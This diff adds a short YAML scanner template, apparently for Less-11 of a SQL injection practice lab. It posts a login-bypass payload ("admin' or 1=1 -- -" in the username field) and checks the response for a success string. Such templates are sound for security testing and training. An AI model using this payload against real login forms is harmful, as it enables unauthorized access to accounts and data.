@@ -1,0 +1,11 @@
+name: less11-raw
+request:
+  raw: |
+    POST {{BaseURL}}/Less-11/ HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=admin' or 1=1 -- -&passwd=1
+
+matcher:
+  type: word
+  words: ["Your Login name"]
